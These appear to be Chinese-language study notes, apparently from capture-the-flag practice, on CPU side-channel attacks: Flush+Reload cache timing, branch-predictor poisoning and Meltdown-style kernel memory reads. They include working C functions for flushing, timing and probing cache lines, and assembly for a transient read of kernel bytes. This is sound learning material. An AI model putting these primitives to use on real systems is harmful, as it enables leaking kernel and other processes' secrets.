cpu 预加载，顺序内存访问时提前加载到缓存
- 使用线性同余计算打乱顺序
    - 例：当加载 0xff 个地址时，`(i*0xa7 + 0xd) & 0xff`

mmap 分配虚拟内存时并未关联物理内存
- 可分配超量内存
- 在对虚拟内存进行操作时触发缺页，从而实际关联物理内存
- 遍历超量虚拟内存最终将耗尽资源而触发终止

cpu 拥有多类/多个组件，在微架构中以乱序执行，尝试排满组件而不是线性执行
- 仅对程序/系统提供了顺序执行的抽象
- 在微架构层面发生的竞争条件
    - 加载内存到缓存的非预期分支
    - 由于触发错误而后续不应当执行的操作

```asm
lea rdi, [buffer]
mov sil, BYTE PTR [kernel_address]
mov rdx, [rdi + rsi * 0x1000]
```
- 泄露内核字节，以受控 buf 为基址，微架构使用内核值加载受控 buf 偏移的内存页中的缓存行，此时检测缓存命中以提取内核字节
    - `mmap` 创建可控内存 buf


cpu 的分支预测器记录分支历史，用来预测之后的跳转分支
- 每个 cpu 都有其 2bit 分支预测器，不同进程需 pin cpu
    - 条件分支预测器 `je`
        - 执行通常不会执行的分支
    - 间接分支预测器 `call`
        - 传递非预期参数到目标函数中
            - 多次调用目标**功能**函数，以执行功能
            - 一次调用目标**参数**函数，以传递参数
            - 间接分支预测器的预执行，将向目标功能函数传递目标参数
    - 3次即可污染
- 多次运行以污染分支预测器，从而在微架构层面瞬时执行目标分支指令
    - 包括同一代码块或其他函数或片段的代码块
    



tips:
- `volatile` 变量类型前缀，确保访问内存且不被优化掉
    - 高效检测已确认存在的内存中，缓存与未缓存的差异。对于未映射地址将报错
- `__builtin_prefetch` gcc 内置函数，预存取指令
    - 高效检测缓存映射地址与未映射地址的差异，加载不存在的地址也不会报错
        - 确认有效的内存地址
        - `clflush` 对不存在的页面触发段错误
- 预存取3种状态的时间：被缓存的地址 < 不存在的未映射地址 <= 存在但未被缓存的地址
    - 第一次：时间不定，未缓存的页面甚至花费更多时间。操作结束后，若地址存在则被缓存
    - 第二次：将3种状态缩减到2种，仅区分未映射与被缓存
    - 本质为创造一个缓存 hit
- `sched_yield` 进程让出 cpu，确保父进程代码执行完毕
- 触发挑战程序条件分支，地址加载对应其中一个分支
    - 根据是否 hit 推测条件值

刷新与加载，缓存命中时间差：
- pin cpu
- 刷新感兴趣的地址
    ```c
    void flush_cache(void *base_addr){
        for (int i=0; i<=0xff; i++){
            _mm_clflush((char*)base_addr + 0x1000*i);
        } 
        
        // 所有内存同步
        _mm_mfence();
        // 内存加载同步与指令同步
        _mm_lfence(); 
    }
    ```
- 测试缓存时间阈值
    ```c
    uint64_t test_hit_miss_threshold(char* base_addr){

        char* test_addr = base_addr + 77*0x1000;
        uint64_t time_threshold = 0, hit_time_sum = 0, hit_time, miss_time;
        int test_count = 5;

        // 测试 hit
        for(int i=0; i<test_count; i++){
            // 清空缓存行
            flush_cache(base_addr);
            // __builtin_prefetch(test_addr, 0, 1); // 预取仅测试地址是否映射
            // 读取内存操作
            volatile char test_char = *(char*)test_addr;
            // 测试时间
            hit_time = flush_reload(test_addr);
            hit_time_sum += hit_time;
            printf("o hit_time %lu\n", hit_time);
        }

        // 测试 miss
        for(int i=0; i<test_count; i++){
            flush_cache(base_addr);
            miss_time = flush_reload(test_addr);
            printf("x miss_time %lu\n", miss_time);
        }

        time_threshold = hit_time_sum / test_count *1.5;

        printf(">>>>> time_threshold %lu\n", time_threshold);
        return time_threshold;
    }
    ```
- 污染分支预测器，包含同步
    - 仅需少量次数
- 刷新
- 触发挑战程序的内存操作，以加载目标地址
- 时间检测，线性同余循环遍历可能的地址，查找阈值范围的地址
    - 直接返回阈值下的值，或计入数组
        ```c
        // char* get_goal(char* base_addr, uint64_t time_threshold){
        uint64_t get_goal(char* base_addr, uint64_t time_threshold){
            uint64_t i_r;
            char *cur_addr;
            uint64_t cur_time;

            // 线性同余遍历页
            for (uint64_t i=0; i<=0xff; i++){
                i_r = (i*0xa7 + 0xd) & 0xff;

                // 挑战从基址读取元数据，排除基址页
                // 仅适用于可见字符，提取数据时应当移除
                //if(i_r==0){
                //    continue;
                //}
                // i_r = (i*0x13371 + 0xbeef) & 0xffffff;

                cur_addr = base_addr + 0x1000*i_r;

                cur_time = flush_reload(cur_addr);

                // printf("get_goal, cur_time = %lu, i_r = %lu %c\n", cur_time, i_r, i_r);

                // 小于阈值则返回地址或索引
                if (cur_time < time_threshold){
                    // return cur_addr;
                    return i_r;
                }
            }  

            return -1;
        }
        ```
    - 检测缓存命中
        - 同步，计时，同步，预取，同步，计时，刷新，计算时间差，同步
            - 刷新对不存在的页面触发错误
        - 使用 `__builtin_prefetch`, 
            或 `volatile x` + `_mm_clflush` 组合     
        ```c
        uint64_t flush_reload(void *addr_ptr){
            uint64_t begin_time, end_time, use_time;
            unsigned int not_use;

            // 第一次缓存预热，第二次实际判断加载时间差异
            // __builtin_prefetch(addr_ptr, 0, 1);  // 预取仅测试地址是否映射

            // 所有内存同步
            _mm_mfence();

            // 指令同步并计时
            begin_time = __rdtscp(&not_use);

            // 读取内存操作
            volatile char test_char = *(char*)addr_ptr;
            // __builtin_prefetch(addr_ptr, 0, 1);  // 预取仅测试地址是否映射

            // 内存加载同步与指令同步
            _mm_lfence();
            
            // 指令同步并计时
            end_time = __rdtscp(&not_use);

            use_time = end_time - begin_time;
            return use_time;
        }
        ```
    - 若 hit 到阈值范围则累计，累计多次则继续下一轮。
    - 若本轮结束后未发现则 -=1 外层循环变量
    - 内存同步
        - `_mm_lfence` 内存加载同步，额外拥有指令同步效果
    - 时间计数
        - `__rdtsc` 仅计时，有时导致失败
        - `__rdtscp` 额外拥有指令同步效果，更容易成功

瞬时指令，cpu 在微架构中预测执行程序不会执行的指令：
- 慢速操作执行的过程中
    - 浮点数计算使用专用寄存器
    - 依赖的指令链
    - 缓存未命中内存操作
    - cpu 高占用

    ```asm
    ; 最终尝试读取虚拟内存地址 0x1337 触发段错误
    ; 移动立即数，压栈，转移到浮点数寄存器，计算平方根，写入栈，弹出，访问
    mov rax, 0x1337
    push rax
    fild QWORD PTR [rsp]
    fsqrt
    fistp QWORD PTR [rsp]
    pop rax
    mov rax, [rax]
    ```
    - 依赖的指令链以及浮点数专用寄存器与计算，尝试在触发段错误前增加消耗时间
- 发生内存加载到缓存的操作，即使程序分支未触及

流程：设置命中阈值，乱序攻击，累计计数，不足则重试
- 测试缓存 miss hit 的时间，使用 hit 时间的某个倍数作为阈值
- 污染分支预测器，尝试在微架构层面执行瞬时指令
- 同步：
    - `sem_getvalue` 检测信号量是否被完全消耗
    - `sched_yield` 让出 cpu，确保其他进程代码执行完毕
    - `usleep` 暂停执行
- 将所有阈值范围的字符计数 +=1，若循环后最大计数为0或很小，则循环变量 -=1 继续计数

熔断：
- 概念
    - 读取内核地址的字节
    - 使用内核字节作为受控内存页的索引
    - 用户态直接对内核地址的访问将触发段错误。但在微架构层面上，预执行触发可被观测到的缓存动作
        - 通过测量缓存时间作为侧信道，得到内核虚拟地址数据
    - 在触发段错误前的时间窗口内，执行内核空间与可控空间的两次内存读取
        - 操作时间越短越可能或决定是否成功
            - 可控空间使用地址加载时间作为侧信道，无法缩减
            - 对于内核空间，在测试前尝试触发内核地址的缓存预热以缩短时间
            - 使用 -O2或3 进行编译以减少指令数量        
        - 即，增加目标程序的处理时间以增大时间窗口，并缩短攻击的时间以在窗口内完成
- 步骤
    - mmap 内存页作为可控空间

        - `sigsetjmp` `siglongjmp`  控制流
    - 尝试触发内核目标地址缓存预热，缩减之后对此访问的时间
    - 访问内核地址读取字节
    - 使用内核字节在可控空间进行内存页索引，触发微架构层面的缓存操作 
        - `mmap[字节*0x1000]`
